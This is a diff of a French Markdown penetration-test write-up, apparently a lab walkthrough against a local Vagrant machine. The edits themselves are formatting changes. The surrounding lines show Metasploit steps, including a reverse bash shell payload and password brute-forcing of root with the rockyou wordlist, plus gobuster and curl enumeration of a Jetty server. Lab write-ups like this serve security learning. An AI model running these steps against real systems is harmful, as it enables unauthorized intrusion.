@@ -180,7 +180,7 @@ set PASSWORD vagrant
 run
 ```
 
-#### 📸 Résultat attendu
+#### 📸 Résultat
 - Connexion réussie :  
 ```bash
 session -i 1
@@ -359,7 +359,7 @@ Ainsi, le service Apache a fourni **plusieurs vecteurs d’attaque critiques** :
 
 
 #### 🛠️ Étape 2 – Énumération (informations & partages)
-Lister au maximum avant d’exploiter.
+Lister au maximum avant d’exploiter :
 
 ```bash
 # Enumération complète
@@ -530,6 +530,7 @@ set PAYLOAD cmd/unix/reverse_bash
 run
 ```
 ![alt text](image-36.png)
+
 ➡️ Résultat : **échec** (aucun CGI vulnérable détecté).
 
 ```bash
@@ -587,6 +588,7 @@ set PASS_FILE /usr/share/wordlists/rockyou.txt
 run
 ```
 ![alt text](image-16.png)
+
 ➡️ Objectif : tester si le compte **root** ou d’autres utilisateurs possèdent un mot de passe trivial (ex. `root`, `password`, vide...).
 
 **Résultat :**  
@@ -647,7 +649,9 @@ Jetty est un serveur web/servlet Java permettant d’héberger des applications 
 1. **Accès direct via navigateur** :  
    
    URL : `http://192.168.1.32:8080`  
+
 ![alt text](image-18.png)
+
    ➡️ Réponse :  
    - Erreur **404 Not Found**  
    - Mais le serveur liste une application déployée : **Apache Continuum 1.4.2**.  
@@ -658,7 +662,8 @@ Jetty est un serveur web/servlet Java permettant d’héberger des applications 
    gobuster dir -u http://192.168.1.32:8080 -w /usr/share/wordlists/dirb/common.txt
    ```
 ![alt text](image-19.png)
-   ➡️ Rien de significatif, à part /favicon.ico.
+
+➡️ Rien de significatif, à part /favicon.ico.
 
 
 1. **Identification des en-têtes HTTP** :  
@@ -666,11 +671,14 @@ Jetty est un serveur web/servlet Java permettant d’héberger des applications 
    curl -I http://192.168.1.32:8080
    ```
 ![alt text](image-20.png)
-   ➡️ Confirme la version Jetty : 8.1.7.v20120910
+
+➡️ Confirme la version Jetty : 8.1.7.v20120910
 
 
 #### 🚀 Étape 3 – Recherche d’exploits Metasploit
-Commande :  
+
+Commande :
+
 ```bash
 search jetty
 ```
